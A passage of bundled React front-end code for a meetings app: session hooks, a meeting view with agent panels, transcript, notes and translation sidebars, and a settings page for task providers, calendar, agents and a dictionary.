	const agentMessageMutation = useMutation({
		mutationFn: (vars) => meetingsApi.message(meetingId, vars.agentId, vars.text),
		onSuccess: () => invalidate(),
		onError: (error) => failureNotice(error, i18nT("apps.meetings.session.messageFailed"))
	});
	const resetAgentsMutation = useMutation({
		mutationFn: () => meetingsApi.resetAgents(meetingId),
		onSuccess: () => {
			notify(i18nT("apps.meetings.session.agentsResumed"), { type: "info" });
			invalidate();
		}
	});
	const attachmentMutation = useMutation({
		mutationFn: (vars) => meetingsApi.attachments(meetingId, vars),
		onSuccess: () => invalidate(),
		onError: (error) => failureNotice(error, i18nT("apps.meetings.session.attachmentFailed"))
	});
	const addTaskMutation = useMutation({
		mutationFn: (description) => meetingsApi.addTask(meetingId, description),
		onSuccess: () => invalidate(),
		onError: (error) => failureNotice(error, i18nT("apps.meetings.session.taskAddFailed"))
	});
	const updateTaskMutation = useMutation({
		mutationFn: (vars) => meetingsApi.updateTask(meetingId, vars.taskId, vars.fields),
		onSuccess: () => invalidate()
	});
	const deleteTaskMutation = useMutation({
		mutationFn: (taskId) => meetingsApi.deleteTask(meetingId, taskId),
		onSuccess: () => invalidate()
	});
	const fileTaskKey = [...scope, "fileTask"];
	const fileTaskMutation = useMutation({
		mutationKey: fileTaskKey,
		mutationFn: (taskId) => meetingsApi.fileTask(meetingId, taskId),
		onSuccess: () => {
			notify(i18nT("apps.meetings.session.taskFiled"), { type: "success" });
			invalidate();
		},
		onError: (error) => failureNotice(error, i18nT("apps.meetings.session.taskFileFailed"))
	});
	const filingIds = useMutationState({
		filters: {
			mutationKey: fileTaskKey,
			status: "pending"
		},
		select: (mutation) => mutation.state.variables
	});
	const reviewTaskMutation = useMutation({
		mutationFn: (vars) => meetingsApi.reviewTask(meetingId, vars.taskId, vars.reviewStatus),
		onSuccess: () => invalidate()
	});
	const toggleChatView = useCallback((agentId) => {
		setChatViewAgents((prev) => prev.includes(agentId) ? prev.filter((id) => id !== agentId) : [...prev, agentId]);
	}, []);
	return {
		meetingId,
		meta,
		status,
		live,
		agents,
		enabledAgents,
		enabledIds,
		mutedAgents,
		outputs,
		/** Editable minutes: keyed by agent id, present only where an edit exists. */
		outputEdits,
		/** True while a minutes save or revert is in flight, for either agent. */
		editingOutput: editOutputMutation.isPending || revertOutputMutation.isPending,
		saveOutput: (agentId, content) => editOutputMutation.mutateAsync({
			agentId,
			content
		}),
		revertOutput: (agentId) => revertOutputMutation.mutateAsync(agentId),
		tasks,
		transcript,
		partialTranscript,
		transcriptFull,
		caption,
		chatViewAgents,
		selectedPreset,
		transcription,
		/**
		* The user's own note. Not polled — the draft is the authoritative copy, and
		* it outlives the panel (see `useNoteDraft`), so every field the panel renders
		* comes from the hook rather than from component state.
		*/
		note: {
			open: noteOpen,
			draft: noteDraft.draft,
			dirty: noteDraft.dirty,
			loaded: noteDraft.loaded,
			updatedAt: noteQuery.data?.updated_at ?? "",
			path: noteQuery.data?.path ?? "",
			saving: noteDraft.saving,
			saveFailed: noteDraft.saveFailed,
			loadFailed: noteLoadFailed,
			uploading: noteDraft.uploading,
			uploadError: noteDraft.uploadError
		},
		setNoteOpen,
		changeNote: noteDraft.change,
		flushNote: noteDraft.flush,
		pasteNoteImage: noteDraft.pasteImage,
		/**
		* The step before leaving the meeting view. Saves the note and resolves once the
		* server has answered: `true` when it is safe to go (the note is on disk, or
		* there was nothing to save), `false` when the save was refused. The draft is
		* held by this hook, which the view unmounts on the way out — so the caller
		* navigates only on `true`, and on `false` stays where the text still is, with
		* the panel opened so the refusal it renders is on screen.
		*/
		leaveNote: async () => {
			const saved = await noteDraft.exit();
			if (!saved) {
				setTranslationOpen(false);
				setNoteOpen(true);
			}
			return saved;
		},
		/** Live translation: `''` language means the feature is off. */
		translation: {
			language: translationLanguage,
			/** Endonym from the server; falls back to the code until the first poll lands. */
			languageLabel: translationQuery.data?.languageLabel || translationLanguage,
			open: translationOpen,
			lines: translationQuery.data?.lines ?? [],
			pending: translationQuery.data?.pending ?? 0,
			dropped: translationQuery.data?.dropped ?? 0,
			loading: translationQuery.isFetching && translationQuery.data === void 0
		},
		setTranslationOpen,
		loading: initQuery.isLoading || metaQuery.isLoading,
		error: initQuery.error ?? metaQuery.error,
		agentsPaused: Boolean(live?.agents_paused),
		syncing: metaQuery.isFetching || outputsQuery.isFetching || transcriptQuery.isFetching,
		setSelectedPreset,
		toggleChatView,
		refresh: invalidate,
		actions: {
			start: () => startMutation.mutate({ restart: status === "ended" }),
			pause: () => requestStatus("paused"),
			resume: () => requestStatus("active"),
			review: () => requestStatus("reviewing"),
			backToMeeting: () => requestStatus("paused"),
			stop: () => stopMutation.mutate(),
			rename: (title) => renameMutation.mutateAsync(title),
			mute: (agentId, muted) => muteMutation.mutate({
				agentId,
				muted
			}),
			toggleAgent: (agentId, enable) => toggleAgentMutation.mutate({
				agentId,
				enable
			}),
			broadcast: (text) => broadcastMutation.mutate(text),
			messageAgent: (agentId, text) => agentMessageMutation.mutate({
				agentId,
				text
			}),
			resetAgents: () => resetAgentsMutation.mutate(),
			addAttachment: (url, label) => attachmentMutation.mutate({
				action: "add",
				attachments: [{
					type: "url",
					url,
					label
				}]
			}),
			removeAttachment: (index) => attachmentMutation.mutate({
				action: "remove",
				index
			}),
			addTask: (description) => addTaskMutation.mutate(description),
			updateTask: (taskId, fields) => updateTaskMutation.mutate({
				taskId,
				fields
			}),
			deleteTask: (taskId) => deleteTaskMutation.mutate(taskId),
			fileTask: (taskId) => fileTaskMutation.mutate(taskId),
			archiveTask: (taskId) => reviewTaskMutation.mutate({
				taskId,
				reviewStatus: "archived"
			}),
			unarchiveTask: (taskId) => reviewTaskMutation.mutate({
				taskId,
				reviewStatus: "pending"
			})
		},
		/** The last start attempt's error. MeetingView shows it in an inline
		*  ErrorNotice beside the Start button; it is the ONLY surface for a failed
		*  start (no toast), so the reason is shown once. */
		startError: startMutation.error ?? null,
		/** Localized copy for `startError`, so the notice names the blocker
		*  rather than showing the raw server text. */
		startErrorMessage: (() => {
			const err = startMutation.error;
			if (!err) return null;
			return err instanceof MeetingsApiError && err.status === 409 ? conflictMessage(err) : i18nT("apps.meetings.session.startFailed");
		})(),
		/** The last transcription error while the meeting is active, for the
		*  inline ErrorNotice (shown instead of a toast). */
		transcriptionErrorMessage,
		/** The code behind `transcriptionErrorMessage`, so MeetingView can offer
		*  the Voice settings link for `stt_streaming_disabled`. */
		transcriptionErrorCode,
		/** Close the inline start-error notice. */
		dismissStartError: resetStart,
		/** Close the inline transcription-error notice. */
		dismissTranscriptionError: () => setTranscriptionError(null),
		pending: {
			starting: startMutation.isPending,
			stopping: stopMutation.isPending,
			/** The target status of an in-flight pause/resume/review change, or null. */
			settingStatus: statusMutation.isPending ? statusMutation.variables ?? null : null,
			filing: fileTaskMutation.isPending ? fileTaskMutation.variables : null,
			/** Every action item with a filing in flight, oldest first. */
			filingIds
		}
	};
}
// src/MeetingView.tsx
function MeetingView({ eventId, fallbackTitle, config, onBack, onOpenSettings, notify }) {
	const session = useMeetingSession({
		eventId,
		fallbackTitle,
		config,
		notify
	});
	const [sidebarOpen, setSidebarOpen] = useState(false);
	const leave = async (to = onBack) => {
		if (await session.leaveNote()) to();
		else setSidebarOpen(false);
	};
	const [attachMenuOpen, setAttachMenuOpen] = useState(false);
	const { meta, status, agents, enabledAgents, enabledIds, mutedAgents, outputs, startError, startErrorMessage, transcriptionErrorMessage, transcriptionErrorCode, dismissStartError, dismissTranscriptionError, outputEdits, editingOutput, tasks, transcript, partialTranscript, transcriptFull, caption, chatViewAgents, selectedPreset, loading, error, agentsPaused, syncing, actions, pending, translation, note } = session;
	const { expandedId, toggle: toggleExpanded } = useExpandedAgent(enabledAgents.map((agent) => agent.id));
	if (loading) return /* @__PURE__ */ jsx(Skeleton, { className: "h-40 m-6" });
	if (error) return /* @__PURE__ */ jsx(ui_default$2, {
		title: i18nT("apps.meetings.meeting.loadFailed"),
		message: error.message,
		askAgent: true,
		className: "m-6"
	});
	if (status === "reviewing") return /* @__PURE__ */ jsx(TaskReviewView, {
		tasks,
		transcript,
		partialTranscript,
		transcriptFull,
		provider: config?.task_provider ?? "",
		filing: pending.filing,
		filingIds: pending.filingIds,
		onBack: actions.backToMeeting,
		onClose: () => {
			actions.stop();
			leave();
		},
		onFile: actions.fileTask,
		onArchive: actions.archiveTask,
		onUnarchive: actions.unarchiveTask
	});
	const promptForLink = () => {
		const trimmed = (window.prompt(i18nT("apps.meetings.meeting.attachPrompt")) ?? "").trim();
		if (!trimmed) return;
		let label = trimmed;
		try {
			label = new URL(trimmed).hostname || trimmed;
		} catch {}
		actions.addAttachment(trimmed, label);
		setAttachMenuOpen(false);
	};
	return /* @__PURE__ */ jsxs("div", {
		className: "flex flex-col lg:flex-row h-full overflow-hidden",
		children: [
			/* @__PURE__ */ jsxs("div", {
				className: "flex-1 min-w-0 min-h-0 flex flex-col overflow-hidden",
				children: [
					/* @__PURE__ */ jsxs("div", {
						className: "flex-none px-4 md:px-6 py-4 border-b border-border flex items-center justify-between gap-3",
						children: [/* @__PURE__ */ jsxs("div", {
							className: "flex items-center gap-3 min-w-0",
							children: [
								/* @__PURE__ */ jsxs(Btn$1, {
									onClick: () => {
										leave();
									},
									"aria-label": i18nT("apps.meetings.meeting.back"),
									children: [/* @__PURE__ */ jsx(ArrowLeft, { className: "lucide-inline" }), i18nT("apps.meetings.meeting.back")]
								}),
								/* @__PURE__ */ jsx(MeetingTitle, {
									title: meta?.title ?? "",
									onRename: actions.rename
								}),
								status === "active" && pending.settingStatus !== "paused" && pending.settingStatus !== "reviewing" && /* @__PURE__ */ jsx(Badge, {
									variant: "ok",
									children: i18nT("apps.meetings.meeting.live")
								}),
								(status === "active" || status === "paused") && pending.settingStatus === "reviewing" && /* @__PURE__ */ jsx(Badge, {
									variant: "warn",
									children: i18nT("apps.meetings.meeting.endingReview")
								}),
								status === "active" && pending.settingStatus === "paused" && /* @__PURE__ */ jsx(Badge, {
									variant: "warn",
									children: i18nT("apps.meetings.meeting.pausing")
								}),
								status === "paused" && pending.settingStatus !== "active" && pending.settingStatus !== "reviewing" && /* @__PURE__ */ jsx(Badge, {
									variant: "warn",
									children: i18nT("apps.meetings.meeting.paused")
								}),
								status === "paused" && pending.settingStatus === "active" && /* @__PURE__ */ jsx(Badge, {
									variant: "warn",
									children: i18nT("apps.meetings.meeting.resuming")
								}),
								status === "ended" && /* @__PURE__ */ jsx(Badge, {
									variant: "muted",
									children: i18nT("apps.meetings.meeting.ended")
								})
							]
						}), /* @__PURE__ */ jsxs("div", {
							className: "flex items-center gap-2 flex-wrap justify-end",
							children: [
								(status === "idle" || status === "ended") && /* @__PURE__ */ jsxs(SendBtn, {
									onClick: actions.start,
									disabled: pending.starting,
									"aria-label": status === "ended" ? i18nT("apps.meetings.meeting.restart") : i18nT("apps.meetings.meeting.start"),
									children: [/* @__PURE__ */ jsx(Play, { className: "lucide-inline" }), status === "ended" ? i18nT("apps.meetings.meeting.restart") : i18nT("apps.meetings.meeting.start")]
								}),
								status === "active" && pending.settingStatus !== "reviewing" && /* @__PURE__ */ jsxs(Btn$1, {
									onClick: actions.pause,
									disabled: pending.settingStatus !== null,
									"aria-label": pending.settingStatus === "paused" ? i18nT("apps.meetings.meeting.pausing") : i18nT("apps.meetings.meeting.pause"),
									children: [/* @__PURE__ */ jsx(Pause, { className: "lucide-inline" }), pending.settingStatus === "paused" ? i18nT("apps.meetings.meeting.pausing") : i18nT("apps.meetings.meeting.pause")]
								}),
								status === "paused" && /* @__PURE__ */ jsxs(Btn$1, {
									onClick: actions.resume,
									disabled: pending.settingStatus !== null,
									"aria-label": pending.settingStatus === "active" ? i18nT("apps.meetings.meeting.resuming") : i18nT("apps.meetings.meeting.unpause"),
									children: [/* @__PURE__ */ jsx(Play, { className: "lucide-inline" }), pending.settingStatus === "active" ? i18nT("apps.meetings.meeting.resuming") : i18nT("apps.meetings.meeting.unpause")]
								}),
								/* @__PURE__ */ jsxs(DropdownMenu, { children: [/* @__PURE__ */ jsx(DropdownMenuTrigger, {
									asChild: true,
									children: /* @__PURE__ */ jsx(Btn$1, {
										className: "!px-1.5",
										"aria-label": i18nT("apps.meetings.meeting.moreActions"),
										title: i18nT("apps.meetings.meeting.moreActions"),
										children: /* @__PURE__ */ jsx(MoreHorizontal, { size: 14 })
									})
								}), /* @__PURE__ */ jsxs(DropdownMenuContent, {
									align: "end",
									className: "min-w-[200px]",
									children: [
										(status === "active" || status === "paused") && /* @__PURE__ */ jsxs(Fragment$1, { children: [/* @__PURE__ */ jsxs(DropdownMenuItem, {
											disabled: pending.settingStatus !== null,
											onSelect: actions.review,
											children: [/* @__PURE__ */ jsx(Square, {
												size: 13,
												className: "shrink-0 text-danger"
											}), /* @__PURE__ */ jsx("span", { children: i18nT("apps.meetings.meeting.endAndReview") })]
										}), /* @__PURE__ */ jsx(DropdownMenuSeparator, {})] }),
										/* @__PURE__ */ jsxs(DropdownMenuItem, {
											disabled: syncing,
											onSelect: session.refresh,
											children: [/* @__PURE__ */ jsx(RefreshCw, {
												size: 13,
												className: `shrink-0 text-muted ${syncing ? "animate-spin" : ""}`
											}), /* @__PURE__ */ jsx("span", { children: i18nT("apps.meetings.meeting.refresh") })]
										}),
										/* @__PURE__ */ jsxs(DropdownMenuItem, {
											onSelect: () => {
												setSidebarOpen(false);
												session.setTranslationOpen(false);
												session.setNoteOpen((open) => !open);
											},
											children: [/* @__PURE__ */ jsx(NotebookPen, {
												size: 13,
												className: "shrink-0 text-muted"
											}), /* @__PURE__ */ jsx("span", { children: i18nT("apps.meetings.meeting.toggleNote") })]
										}),
										translation.language && /* @__PURE__ */ jsxs(DropdownMenuItem, {
											onSelect: () => {
												setSidebarOpen(false);
												session.setNoteOpen(false);
												session.setTranslationOpen((open) => !open);
											},
											children: [/* @__PURE__ */ jsx(Languages, {
												size: 13,
												className: "shrink-0 text-muted"
											}), /* @__PURE__ */ jsx("span", { children: i18nT("apps.meetings.meeting.toggleTranslation") })]
										}),
										/* @__PURE__ */ jsxs(DropdownMenuItem, {
											onSelect: () => {
												session.setTranslationOpen(false);
												session.setNoteOpen(false);
												setSidebarOpen((open) => !open);
											},
											children: [/* @__PURE__ */ jsx(ListChecks, {
												size: 13,
												className: "shrink-0 text-muted"
											}), /* @__PURE__ */ jsxs("span", { children: [i18nT("apps.meetings.meeting.toggleTasks"), tasks.length > 0 ? ` (${tasks.length})` : ""] })]
										})
									]
								})] })
							]
						})]
					}),
					transcriptionErrorMessage && /* @__PURE__ */ jsx(ui_default$2, {
						message: transcriptionErrorMessage,
						onDismiss: dismissTranscriptionError,
						className: "mx-4 mt-2 animate-rise",
						footer: transcriptionErrorCode === "stt_streaming_disabled" ? /* @__PURE__ */ jsx(Link, {
							to: settingsPath({ tab: "voice" }),
							className: "underline",
							children: i18nT("apps.meetings.session.openVoiceSettings")
						}) : null
					}),
					startError && startErrorMessage && /* @__PURE__ */ jsx(ui_default$2, {
						message: startErrorMessage,
						onDismiss: dismissStartError,
						className: "mx-4 mt-2 animate-rise"
					}),
					/* @__PURE__ */ jsx(AgentPillBar, {
						agents,
						enabledIds,
						mutedAgents,
						presets: config?.presets ?? {},
						defaultPreset: config?.default_preset ?? "",
						selectedPreset,
						status,
						attachments: meta?.attachments ?? [],
						attachMenuOpen,
						onPresetChange: session.setSelectedPreset,
						onToggleAgent: actions.toggleAgent,
						onOpenSettings: () => {
							leave(onOpenSettings);
						},
						onToggleAttachMenu: () => setAttachMenuOpen((open) => !open),
						onAddAttachment: promptForLink,
						onRemoveAttachment: actions.removeAttachment
					}),
					/* @__PURE__ */ jsx(AnimatePresence, { children: agentsPaused && /* @__PURE__ */ jsxs(motion.div, {
						initial: {
							opacity: 0,
							y: -8
						},
						animate: {
							opacity: 1,
							y: 0
						},
						exit: {
							opacity: 0,
							y: -8
						},
						className: "flex-none mx-6 mt-3 px-3 py-2 rounded-lg bg-danger/10 border border-danger/20 flex items-center justify-between gap-3",
						children: [/* @__PURE__ */ jsxs("span", {
							className: "text-[13px] text-danger font-medium inline-flex items-center gap-1.5",
							children: [/* @__PURE__ */ jsx(AlertTriangle, { className: "lucide-inline" }), i18nT("apps.meetings.meeting.agentsPaused")]
						}), /* @__PURE__ */ jsx(Btn$1, {
							onClick: actions.resetAgents,
							children: i18nT("apps.meetings.meeting.retryAgents")
						})]
					}) }),
					/* @__PURE__ */ jsx(MeetingWorkspace, {
						hasAgentPanels: enabledAgents.length > 0,
						expanded: expandedId !== null,
						agentPanels: /* @__PURE__ */ jsx("div", {
							className: expandedId !== null ? "flex flex-col h-full" : "grid grid-cols-1 2xl:grid-cols-2 gap-3",
							children: enabledAgents.map((agent) => /* @__PURE__ */ jsx(AgentPanelSlot, {
								hidden: expandedId !== null && expandedId !== agent.id,
								expanded: expandedId === agent.id,
								children: /* @__PURE__ */ jsx(AgentPanel, {
									agent,
									expanded: expandedId === agent.id,
									onToggleExpanded: () => toggleExpanded(agent.id),
									output: outputs[agent.id] ?? "",
									listening: !mutedAgents.includes(agent.id),
									chatView: chatViewAgents.includes(agent.id),
									edit: outputEdits[agent.id],
									editSaving: editingOutput,
									onToggleListening: () => actions.mute(agent.id, !mutedAgents.includes(agent.id)),
									onToggleChatView: () => session.toggleChatView(agent.id),
									onSendMessage: (text) => actions.messageAgent(agent.id, text),
									onSaveOutput: agent.widget_type === "markdown" || agent.widget_type == null ? (content) => session.saveOutput(agent.id, content) : void 0,
									onRevertOutput: () => session.revertOutput(agent.id)
								})
							}, agent.id))
						}),
						transcript: /* @__PURE__ */ jsx(TranscriptPanel, {
							segments: transcript,
							partial: partialTranscript,
							primary: enabledAgents.length === 0,
							status,
							resuming: pending.settingStatus === "active",
							full: transcriptFull
						})
					}),
					(status === "active" || status === "paused") && /* @__PURE__ */ jsx(BroadcastBar, {
						onSend: actions.broadcast,
						caption,
						disabled: transcriptFull || status !== "active" || pending.settingStatus !== null,
						placeholder: pending.settingStatus === "paused" ? i18nT("apps.meetings.broadcastBar.pausingPlaceholder") : pending.settingStatus === "active" ? i18nT("apps.meetings.broadcastBar.resumingPlaceholder") : pending.settingStatus === "reviewing" ? i18nT("apps.meetings.meeting.endingReview") : status === "paused" ? i18nT("apps.meetings.broadcastBar.pausedPlaceholder") : void 0
					})
				]
			}),
			note.open && /* @__PURE__ */ jsx(NoteSidebar, {
				draft: note.draft,
				dirty: note.dirty,
				loaded: note.loaded,
				updatedAt: note.updatedAt,
				path: note.path,
				saving: note.saving,
				saveFailed: note.saveFailed,
				loadFailed: note.loadFailed,
				uploading: note.uploading,
				uploadError: note.uploadError,
				onChange: session.changeNote,
				onFlush: session.flushNote,
				onPasteImage: session.pasteNoteImage,
				onClose: () => session.setNoteOpen(false)
			}),
			translation.open && translation.language && /* @__PURE__ */ jsx(TranslationSidebar, {
				lines: translation.lines,
				languageLabel: translation.languageLabel,
				pending: translation.pending,
				dropped: translation.dropped,
				loading: translation.loading,
				onClose: () => session.setTranslationOpen(false)
			}),
			sidebarOpen && /* @__PURE__ */ jsx(TaskSidebar, {
				tasks,
				onClose: () => setSidebarOpen(false),
				onAdd: actions.addTask,
				onUpdate: actions.updateTask,
				onDelete: actions.deleteTask
			})
		]
	});
}
// src/SettingsView.tsx
function SettingsView({ onBack, notify }) {
	const ime = useImeGuard();
	const queryClient = useQueryClient();
	const configQuery = useQuery({
		queryKey: ["meetings", "config"],
		queryFn: meetingsApi.config,
		staleTime: 3e4
	});
	const dictionaryQuery = useQuery({
		queryKey: ["meetings", "dictionary"],
		queryFn: meetingsApi.dictionary
	});
	const aliasRef = useRef(null);
	const correctRef = useRef(null);
	const [sourceDraft, setSourceDraft] = useState(null);
	const config = configQuery.data?.config;
	const calendarProviders = configQuery.data?.calendar_providers ?? [];
	const taskProviders = configQuery.data?.task_providers ?? [];
	const translationLanguages = configQuery.data?.translation_languages ?? [];
	const terms = dictionaryQuery.data?.terms ?? [];
	const saveConfig = useMutation({
		mutationFn: (patch) => meetingsApi.saveConfig(patch),
		onSuccess: (response) => {
			queryClient.setQueryData(["meetings", "config"], (previous) => previous ? {
				...previous,
				config: response.config
			} : previous);
			notify(i18nT("apps.meetings.settings.saved"), { type: "success" });
		},
		onError: () => notify(i18nT("apps.meetings.settings.saveFailed"), { type: "error" })
	});
	const addTerm = useMutation({
		mutationFn: (vars) => meetingsApi.addTerm(vars.correct, vars.aliases),
		onSuccess: (response) => {
			queryClient.setQueryData(["meetings", "dictionary"], { terms: response.terms });
			if (aliasRef.current) aliasRef.current.value = "";
			if (correctRef.current) correctRef.current.value = "";
		},
		onError: () => notify(i18nT("apps.meetings.settings.termFailed"), { type: "error" })
	});
	const removeTerm = useMutation({
		mutationFn: (correct) => meetingsApi.removeTerm(correct),
		onSuccess: (response) => queryClient.setQueryData(["meetings", "dictionary"], { terms: response.terms })
	});
	/** Persist the whole config with one field replaced.
	*
	*  The backend's PUT is a full, validated replace, so a patch must carry the
	*  current values or an unrelated setting would silently reset.
	*
	*  Two things make that safe under rapid changes, and both are load-bearing:
	*
	*  1. The base is read from the CACHE at send time, not from the render-time
	*     `config` snapshot. `saveConfig.onSuccess` writes the server's response back
	*     into the cache, so the second of two saves builds on the first's result
	*     instead of on what was on screen when the component last rendered.
	*  2. Saves are CHAINED. Even reading the cache is not enough on its own: with
	*     two requests in flight, the first has not landed in the cache when the
	*     second is built, so both would send a base missing the other's change and
	*     the later response would revert it. Awaiting the previous save first means
	*     each payload is derived from a config the server has already accepted.
	*/
	const savesRef = useRef(Promise.resolve());
	const patch = (changes) => {
		if (!config) return;
		savesRef.current = savesRef.current.catch(() => void 0).then(() => {
			const latest = queryClient.getQueryData(["meetings", "config"])?.config ?? config;
			const resolved = typeof changes === "function" ? changes(latest) : changes;
			return saveConfig.mutateAsync({
				...latest,
				...resolved
			});
		});
		savesRef.current.catch(() => void 0);
	};
	const updateAgent = (agentId, changes) => {
		if (!config) return;
		patch((latest) => ({ meeting_agents: latest.meeting_agents.map((agent) => agent.id === agentId ? {
			...agent,
			...changes
		} : agent) }));
	};
	const activeCalendar = calendarProviders.find((row) => row.id === config?.calendar.provider);
	const source = sourceDraft ?? config?.calendar.source ?? "";
	const submitTerm = () => {
		const correct = correctRef.current?.value.trim() ?? "";
		const aliases = (aliasRef.current?.value ?? "").split(",").map((alias) => alias.trim()).filter(Boolean);
		if (!correct || aliases.length === 0) {
			notify(i18nT("apps.meetings.settings.termIncomplete"), { type: "error" });
			return;
		}
		addTerm.mutate({
			correct,
			aliases
		});
	};
	return /* @__PURE__ */ jsxs(Fragment$1, { children: [/* @__PURE__ */ jsx(PageHeader, {
		title: i18nT("apps.meetings.settings.title"),
		subtitle: i18nT("apps.meetings.settings.subtitle"),
		actions: /* @__PURE__ */ jsxs(Btn$1, {
			onClick: onBack,
			children: [/* @__PURE__ */ jsx(ArrowLeft, { className: "lucide-inline" }), i18nT("apps.meetings.settings.back")]
		})
	}), /* @__PURE__ */ jsxs("div", {
		className: "px-4 md:px-6 pb-8 overflow-y-auto flex-1 min-h-0",
		children: [
			saveConfig.isError ? /* @__PURE__ */ jsx(ui_default$2, {
				className: "mb-4",
				message: i18nT("apps.meetings.settings.saveFailed")
			}) : null,
			/* @__PURE__ */ jsxs(Card, { children: [
				/* @__PURE__ */ jsxs(CardTitle, { children: [/* @__PURE__ */ jsx(ListChecks, { className: "lucide-inline" }), i18nT("apps.meetings.settings.taskProviderTitle")] }),
				/* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted mb-3",
					children: i18nT("apps.meetings.settings.taskProviderHelp")
				}),
				/* @__PURE__ */ jsx(SimpleSelect, {
					options: taskProviders.map((row) => row.id),
					optionLabels: taskProviders.map((row) => row.label),
					value: config?.task_provider ?? "",
					"aria-label": i18nT("apps.meetings.settings.taskProviderTitle"),
					onChange: (value) => patch({ task_provider: value }),
					style: { maxWidth: 280 }
				})
			] }),
			/* @__PURE__ */ jsxs(Card, { children: [
				/* @__PURE__ */ jsxs(CardTitle, { children: [/* @__PURE__ */ jsx(Languages, { className: "lucide-inline" }), i18nT("apps.meetings.settings.translationTitle")] }),
				/* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted mb-3",
					children: i18nT("apps.meetings.settings.translationHelp")
				}),
				/* @__PURE__ */ jsx(SimpleSelect, {
					options: ["", ...translationLanguages.map((row) => row.id)],
					optionLabels: [i18nT("apps.meetings.settings.translationOff"), ...translationLanguages.map((row) => row.label)],
					value: config?.translation_language ?? "",
					"aria-label": i18nT("apps.meetings.settings.translationTitle"),
					onChange: (value) => patch({ translation_language: value }),
					style: { maxWidth: 280 }
				})
			] }),
			/* @__PURE__ */ jsxs(Card, { children: [
				/* @__PURE__ */ jsxs(CardTitle, { children: [/* @__PURE__ */ jsx(CalendarClock, { className: "lucide-inline" }), i18nT("apps.meetings.settings.calendarTitle")] }),
				/* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted mb-3",
					children: i18nT("apps.meetings.settings.calendarHelp")
				}),
				/* @__PURE__ */ jsxs("div", {
					className: "flex items-center gap-2 flex-wrap",
					children: [/* @__PURE__ */ jsx(SimpleSelect, {
						options: calendarProviders.map((row) => row.id),
						optionLabels: calendarProviders.map((row) => row.label),
						value: config?.calendar.provider ?? "",
						"aria-label": i18nT("apps.meetings.settings.calendarProviderLabel"),
						onChange: (value) => patch((latest) => ({ calendar: {
							...latest.calendar,
							provider: value
						} })),
						style: { minWidth: 180 }
					}), activeCalendar?.requires_source && /* @__PURE__ */ jsxs(Fragment$1, { children: [/* @__PURE__ */ jsx(Input, {
						value: source,
						className: "flex-1 min-w-[280px]",
						placeholder: i18nT("apps.meetings.settings.calendarSourcePlaceholder"),
						"aria-label": i18nT("apps.meetings.settings.calendarSourceLabel"),
						onChange: (e) => setSourceDraft(e.target.value)
					}), /* @__PURE__ */ jsx(SendBtn, {
						onClick: () => {
							patch((latest) => ({ calendar: {
								...latest.calendar,
								source: source.trim()
							} }));
							setSourceDraft(null);
						},
						"aria-label": i18nT("apps.meetings.settings.saveSource"),
						children: i18nT("apps.meetings.settings.saveSource")
					})] })]
				}),
				activeCalendar?.requires_source && /* @__PURE__ */ jsx("p", {
					className: "text-[12px] text-muted mt-2",
					children: i18nT("apps.meetings.settings.calendarSourceHint")
				})
			] }),
			/* @__PURE__ */ jsxs(Card, { children: [
				/* @__PURE__ */ jsx(CardTitle, { children: i18nT("apps.meetings.settings.agentsTitle") }),
				/* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted mb-3",
					children: i18nT("apps.meetings.settings.agentsHelp")
				}),
				/* @__PURE__ */ jsx("div", {
					className: "flex flex-col gap-2",
					children: (config?.meeting_agents ?? []).map((agent) => /* @__PURE__ */ jsxs("div", {
						className: "flex items-center gap-3 px-3 py-2.5 border border-border rounded-md",
						children: [
							/* @__PURE__ */ jsxs("div", {
								className: "flex-1 min-w-0",
								children: [/* @__PURE__ */ jsx("div", {
									className: "text-sm text-text font-medium truncate",
									children: agent.name
								}), /* @__PURE__ */ jsx("div", {
									className: "text-[12px] text-muted font-mono truncate",
									children: agent.id
								})]
							}),
							/* @__PURE__ */ jsx(Badge, {
								variant: "muted",
								children: i18nT(WIDGET_TYPE_LABEL_KEY[agent.widget_type])
							}),
							/* @__PURE__ */ jsx(Toggle, {
								checked: agent.enabled_by_default !== false,
								onChange: (value) => updateAgent(agent.id, { enabled_by_default: value }),
								label: i18nT("apps.meetings.settings.enabledByDefault", { name: agent.name })
							})
						]
					}, agent.id))
				})
			] }),
			/* @__PURE__ */ jsxs(Card, { children: [
				/* @__PURE__ */ jsx(CardTitle, { children: i18nT("apps.meetings.settings.dictionaryTitle") }),
				/* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted mb-3",
					children: i18nT("apps.meetings.settings.dictionaryHelp")
				}),
				terms.length === 0 ? /* @__PURE__ */ jsx(EmptyState, {
					icon: /* @__PURE__ */ jsx(ArrowRight, { className: "lucide-inline" }),
					title: i18nT("apps.meetings.settings.noTerms"),
					subtitle: i18nT("apps.meetings.settings.noTermsHint")
				}) : /* @__PURE__ */ jsx("div", {
					className: "flex flex-col gap-1 mb-3",
					children: terms.map((term) => /* @__PURE__ */ jsxs("div", {
						className: "flex items-center justify-between gap-2 px-3 py-1.5 rounded-md bg-bg-hover",
						children: [/* @__PURE__ */ jsxs("div", {
							className: "min-w-0 text-[13px]",
							children: [
								/* @__PURE__ */ jsx("span", {
									className: "text-muted",
									children: term.aliases.join(", ")
								}),
								/* @__PURE__ */ jsx(ArrowRight, { className: "lucide-inline mx-2 text-muted" }),
								/* @__PURE__ */ jsx("span", {
									className: "text-text font-medium",
									children: term.correct
								})
							]
						}), /* @__PURE__ */ jsx(Btn$1, {
							danger: true,
							onClick: () => removeTerm.mutate(term.correct),
							"aria-label": i18nT("apps.meetings.settings.removeTerm", { term: term.correct }),
							children: /* @__PURE__ */ jsx(Trash2, { className: "lucide-inline" })
						})]
					}, term.correct))
				}),
				addTerm.isError ? /* @__PURE__ */ jsx(ui_default$2, {
					className: "mb-3",
					message: i18nT("apps.meetings.settings.termFailed")
				}) : null,
				removeTerm.isError ? /* @__PURE__ */ jsx(ui_default$2, {
					className: "mb-3",
					message: removeTerm.error.message
				}) : null,
				/* @__PURE__ */ jsxs("div", {
					className: "flex items-center gap-2 flex-wrap",
					children: [
						/* @__PURE__ */ jsx(Input, {
							ref: aliasRef,
							className: "flex-1 min-w-[200px]",
							placeholder: i18nT("apps.meetings.settings.aliasesPlaceholder"),
							"aria-label": i18nT("apps.meetings.settings.aliasesLabel")
						}),
						/* @__PURE__ */ jsx(ArrowRight, { className: "lucide-inline text-muted" }),
						/* @__PURE__ */ jsx(Input, {
							ref: correctRef,
							className: "w-48",
